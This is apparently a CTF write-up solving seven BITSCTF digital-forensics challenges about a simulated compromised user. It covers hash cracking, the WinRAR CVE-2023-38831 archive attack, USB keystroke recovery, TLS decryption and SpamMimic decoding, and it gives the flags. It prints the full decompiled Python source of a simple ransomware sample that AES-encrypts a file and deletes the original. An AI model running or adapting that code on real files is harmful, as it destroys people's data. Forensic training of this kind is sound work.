# Scenario: 
DFIR or Digital Forensics and Incident Response is a field within cybersecurity that focuses on the identification, investigation, and remediation of cyberattacks. Here are the types of analysis you can expect throughout these sequence of challenges! 

## Task 1: Intro to DFIR
Question: There are a total of 7 DFIR challenges, including this. The above linked files are to be used for all of them. Submitting this flag will unlock the subsequent challenges for the category. Lets see what happened with MogamBro :(

Flag: `BITSCTF{DFIR_r0ck55}`

In this DFIR challenge, the authors provided us a memory dump, AD1 image and a pcap file for further analysis. The flag is given directly in the description.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/c3d210be-66ba-40da-9b61-8631d6f9f000)

## Task 2: Access Granted!
Question: First things first. MogamBro is so dumb that he might be using the same set of passwords everywhere, so lets try cracking his PC's password for some luck.

Flag: `BITSCTF{adolfhitlerrulesallthepeople}`

I started the search with the memory dump first. Since we are looking for a password, we can use the windows.hashdump plugin in Vol3 to extract the NTLM hashes and crack MogamBro's password hash.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/0f7f2d2e-a922-447b-a73f-2d060980ede6)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/bab07dbf-c5f8-4cbd-bc55-6af1bd2b7e63)

## Task 3: 0.69 Day
Question: MogamBro was using some really old piece of software for his daily tasks. What a noob! Doesn't he know that using these deprecated versions of the same leaves him vulnerable towards various attacks! Sure he faced the consequences through those spam mails. Can you figure out the CVE of the exploit that the attacker used to gain access to MogamBro's machine & play around with his stuff.

Flag: `BITSCTF{CVE-2023-38831}`

Going through the AD1 image, I found several suspicious files in the Download directory, suggesting that the user probably downloaded malware. Hence, I extracted both the zip (Follow-these-instructions) and exe (lottery.exe) file to understand its behavior and relations via VirusTotal.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/671ad80c-2c7b-47f8-ac7f-1bff1e7d173a)

Analyzing the suspicious zip file, I found out that concept of the attack is by concealing the activation of malicious code within an archive masquerading file formats and craft a weaponized archive.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/a2327916-406f-476e-9daa-691c0c6f9404)

While researching on this specific zip attack, I stumbled about this [blog](https://www.google.com/search?q=WINRAR+CVE+masqurade+files&client=firefox-b-d&sca_esv=3cb7e1ef2cffde3a&sxsrf=ACQVn09gLWOiPvfdk_BV-LwkhEpxSG1rzw%3A1708072414321&ei=3h3PZZ2RE42bseMP0-iX0Ag&ved=0ahUKEwid-IXMua-EAxWNTWwGHVP0BYoQ4dUDCBA&uact=5&oq=WINRAR+CVE+masqurade+files&gs_lp=Egxnd3Mtd2l6LXNlcnAiGldJTlJBUiBDVkUgbWFzcXVyYWRlIGZpbGVzMgcQIRgKGKABMgcQIRgKGKABSOllUKkEWJdlcAN4AJABAJgBowGgAeUQqgEEMjYuMrgBA8gBAPgBAagCEMICChAAGEcY1gQYsAPCAg0QABiABBiKBRhDGLADwgIEECMYJ8ICChAjGIAEGIoFGCfCAgoQABiABBiKBRhDwgILEAAYgAQYsQMYgwHCAgsQLhiABBixAxiDAcICBxAjGOoCGCfCAhMQABiABBiKBRhDGOoCGLQC2AEBwgIWEAAYAxiPARjlAhjqAhi0AhiMA9gBAsICFhAuGAMYjwEY5QIY6gIYtAIYjAPYAQLCAg4QABiABBiKBRixAxiDAcICCxAAGIAEGIoFGJECwgINEAAYgAQYigUYQxixA8ICChAuGEMYgAQYigXCAgUQLhiABMICERAuGIAEGLEDGIMBGMcBGNEDwgIQEAAYgAQYigUYQxixAxiDAcICCBAAGIAEGLEDwgIFEAAYgATCAgYQABgWGB7CAgUQIRigAcICCRAhGAoYoAEYCsICBhAhGAoYCogGAZAGCroGBggBEAEYAboGBggCEAEYCw&sclient=gws-wiz-serp)
that talks about a WinRAR zero-day last year. Then I remembered that the user had WinRAR downloaded in his PC, suggesting that WinRAR was the vulnerable software. Hence, the CVE on this zip attack can be found in the blog.

## Task 4: I'm wired in
Question: MogamBro got scared after knowing that his PC has been hacked and tried to type a SOS message to his friend through his 'keyboard'. Can you find the contents of that message, obviously the attacker was logging him!

Flag: `BITSCTF{BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}`

The question mentioned something about keyboards and keylogging, so I assume we have to find the keystroke history of the user to obtain the flag. Going through the AD1 image again, I noticed a keylog.pcapng file and a key file in the Desktop directory of MogamBro. This key file seems to be a list of TLS keys that can be used for other challenges, so I kept it first.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/03724447-1486-40cf-98cb-a4102e25788b)

After extracting and analyzing the pcapng file, several USB packets can be found, suggesting that this could be coming from a USB keyboard. Researching online about USB packets, I found this [blog](https://medium.com/@sidharthpanda1/usb-sniffer-packet-challenge-cryptoverse-ctf-forensics-c42f2975e8f1) that talks about parsing HID data from the USB packets to extract the keystrokes. Following the blog, I added HID data as a column and exported the packets to a csv file.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/d0c80b8b-c0d4-4011-8ac2-7d458040e13f)

With the csv file, I can then extract the HID data as mentioned in the blog. I researched online to find a way to decode the keystrokes and found this incredible [tool](https://github.com/syminical/PUK). Using the tool, I got the flag.

```
cat hiddata.csv | cut -d "," -f 7 | cut -d "\"" -f 2 | grep -vE "HID Data" > hexoutput.txt

0200000000000000
02000c0000000000
0200000000000000
0000000000000000
00002c0000000000
0000000000000000
00000b0000000000
...
```

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/5f63a60f-f809-4ed3-af65-858799e7e03b)

However, the flag seems to be incorrect because there is an extra '-' placed into the flag. Remove it to get the real flag.

## Task 5: Bypassing Transport Layer
Question: The exploit not only manipulated MogamBro's secret but also tried to establish an external TCP connection to gain further access to the machine. But I don't really think he was able to do so. Can you figure out where the exploit was trying to reach to?

Flag: `BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}`

Basing off the challenge name, it seems that I have to finally analyze the pcap file given on Task 1. Analyzing the powershell history in the AD1 image, you can see that a sequence of commands sets up environment variables for logging SSL/TLS keys, then it captures network traffic and saves the data into the pcap file given by the authors. Remembering I had a key file extracted from the Desktop directory just now, I can probably use it for this challenge to decrypt TLS packets.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/345bd577-69a0-4a62-b120-7d448692dbfa)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/81656f80-1b59-438d-a68f-3dfc6b813c58)

Using Wireshark, I imported the key file to the pcap file to reveal the unencrypted packets. You can do this by `Edit > Preference > Protocols > TLS > Browse key file` and Wireshark should display the unencrypted packets.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/47523f32-2b81-4d24-84cf-2605e5278b35)

Looking through the pcap, I noticed several HTTP2 packets that seem to be images, GIFs and other files. So, I exported the HTTP2 data and found out it was just explicit images and some other text files (bruh 18+).

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/f755883a-af2d-4a51-892f-6cb6bc393228)

![p0](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/f8bcf20f-422f-4813-9ccc-acd0d9442e58)

However, I knew the flag was somewhere in here. So I grep strings the flag and it worked.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/62dfd921-ce78-4b39-bdfa-75c862523c65)

Edit: After awhile, the authors gave a hint on finding the flag where we should focus on pastebin only instead of the explicit stuff. So I tried extracting only pastebin files and the first file seems to hold the flag.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/d3eef57d-5c1c-4175-b078-c2ddfdfcd2e2)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/814c5232-8fba-4c70-ba0b-98ba97b92e00)

## Task 6: Lottery
Question: Now that you know the CVE, figure out how the attacker crafted the payload & executed it to compromise the 'secret'.

Flag: `BITSCTF{1_r3c3ived_7h3_b0mbz}`

The challenge mentioned a 'secret' was compromised and I remember finding an encoded png file called secret (secret.png.enc) in the Download directory with the other suspicious files. Analyzing the suspicious pdf file within the zip, you can see that it basically executes lottery.exe, opens up chrome in incognito mode to a pastebin link, opens up both notepad.exe and secret.png.enc, and finally downloads the content of google.com as a file named 'steps.pdf'.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/f1416171-6c9e-4f40-871e-d43501b9c093)

From my understanding, lottery.exe probably acted as a ransomware and encrypted the 'secret' file since the zip file only acted as a dropper and initializer. So I went ahead and analyze lottery.exe on VirusTotal and found out that lottery.exe was packed with PyInstall.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/52096331-38f6-4f9a-bc58-af08e56cdd29)

Doing some research online, I found a great [tool](https://github.com/extremecoders-re/pyinstxtractor) to extract the contents of a PyInstaller generated executable file. Following the steps, I managed to extract the contents of lottery.exe for decompilation later. Because my Kali VM has Python 3.11 and not 3.8, I used my Windows VM for this challenge instead.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/1d236cf6-567e-4bf2-a79f-1a91955126e4)

Going through the extracted contents, several libraries and dependencies can be found. Within the contents, lottery.pyc can be found and this will be decompiled using another great [tool](https://github.com/extremecoders-re/uncompyle6-builds) that can be used on Windows. After decompiling, we can analyze what lottery.exe actually does now.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/8dfc6e10-950b-46da-8ca3-8ea2ab956d98)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/6a464897-09d1-4f77-96bd-d80f3fba0f2e)

Reading the Python script, it basically generates a random key in binary form and placed into a temporary file to be used for encryption. It also shows that the encryption method was AES-CBC with the IV being in binary form too. Also there seems to be a typo at the generate_key() function where there are two return keywords, so just remove one of them for the complete code as shown below.

```
import os, tempfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_key():
    key = os.urandom(32)
    fp = tempfile.TemporaryFile(mode='w+b', delete=False)
    fp.write(key)
    return key

def encrypt_file(file_path, key):
    iv = b'urfuckedmogambro'
    with open(file_path, 'rb') as (file):
        data = file.read()
        padded_data = pad(data, AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(padded_data)
    file.close()
    encrypted_file_path = file_path + '.enc'
    with open(encrypted_file_path, 'wb') as (encrypted_file):
        encrypted_file.write(encrypted_data)
    os.remove(file_path)

if __name__ == '__main__':
    key = generate_key()
    file_path = 'secret.png'
    encrypt_file(file_path, key)
    print('Dear MogamBro, we are fucking your laptop with a ransomware & your secret image is now encrypted! Send $69M to recover it!')
```

So I have to find the temporary file located somewhere in the AD1 image since the user has definitely executed it already. Doing some research on tempfile.TemporaryFile() function, it seems that the temporary file is located in `C:\Users\MogamBro\AppData\Local\Temp\`. Analyzing the directory, several temporary files can be found and since the key should be 32 bytes, the most likely temporary file that stores the key is 'tmpd1tif_2a'.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/f0578823-af51-4d4f-b077-e68dba743ae6)

Since I have done something like this before on HTB Sherlock, I remember that the binary key can be converted to the right format via CyberChef. Converting the key to hex, we can use it for AES decryption later.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/05910f20-4b5a-4d94-99d9-fc4846664ea3)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/ea7486f0-1d70-471b-b7b9-fc9f5a0e68ad)

Finally, after having the key and IV, we can decrypt the 'secret' file and obtained the flag in the image.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/56cf3686-511f-4c4f-bb58-b956f603ba5b)

## Task 7: MogamBro's guilty pleasure
Question: MogamBro was spammed with a lot of emails, he was able to evade some but fell for some of them due to his greed. Can you analyze the emails & figure out how he got scammed, not once but twice!

Flag: `BITSCTF{sp4m_2_ph1sh_U}`

Reading the challenge, it seems that I have to analyze certain emails to find the flag. Looking through the AD1 image, two suspicious email files can be found in the Outlook directory located in Documents.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/44f5771d-8f00-4d08-9bd6-7e31a080f2d2)

Analyzing both emails, it seems that 'YOU WON A LOTTERY!' email has no information on finding the flag since its just a phishing email for the suspicious zip and exe file previously. However, the other email has some hidden spam text in it where it could lead us to the flag. 

```
Dear Friend , We know you are interested in receiving
red-hot information . We will comply with all removal
requests . This mail is being sent in compliance with
Senate bill 1622 , Title 9 ; Section 305 . THIS IS
NOT MULTI-LEVEL MARKETING ! Why work for somebody else
when you can become rich as few as 24 weeks ! Have
you ever noticed nearly every commercial on television
has a .com on in it plus nearly every commercial on
television has a .com on in it ! Well, now is your
chance to capitalize on this ! WE will help YOU deliver
goods right to the customer's doorstep and deliver
goods right to the customer's doorstep ! You can begin
at absolutely no cost to you . But don't believe us
! Mrs Jones of New Mexico tried us and says "I've been
poor and I've been rich - rich is better" ! We are
licensed to operate in all states . We IMPLORE you
- act now ! Sign up a friend and you get half off !
Thanks . Dear Salaryman ; Your email address has been
submitted to us indicating your interest in our letter
. If you no longer wish to receive our publications
simply reply with a Subject: of "REMOVE" and you will
immediately be removed from our mailing list . This
mail is being sent in compliance with Senate bill 1627
, Title 6 , Section 303 . This is not multi-level marketing
. Why work for somebody else when you can become rich
as few as 70 WEEKS ! Have you ever noticed people love
convenience and most everyone has a cellphone ! Well,
now is your chance to capitalize on this . WE will
help YOU process your orders within seconds plus turn
your business into an E-BUSINESS . You are guaranteed
to succeed because we take all the risk . But don't
believe us ! Prof Ames of Louisiana tried us and says
"I've been poor and I've been rich - rich is better"
! We are licensed to operate in all states . Do not
delay - order today ! Sign up a friend and you'll get
a discount of 50% . Thank-you for your serious consideration
of our offer .
```

Doing some research, I found out from this [GIAC paper](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwiE_7rprbCEAxXYXGwGHfNGCYcQFnoECBAQAQ&url=https%3A%2F%2Fwww.giac.org%2Fpaper%2Fgsec%2F1461%2Fsteganography-real-risk%2F102743&usg=AOvVaw2B7I64siMt2cjebgs5sTwR&opi=89978449) that the spam text is actually encoded using a method called SpamMimic.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/53280b9b-0923-4ca5-91c5-c1c450838634)

So, I just had to find an online tool to decode the SpamMimic text and the flag can be obtained.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/6b50af3f-576d-4661-87dc-0310d474fea9)
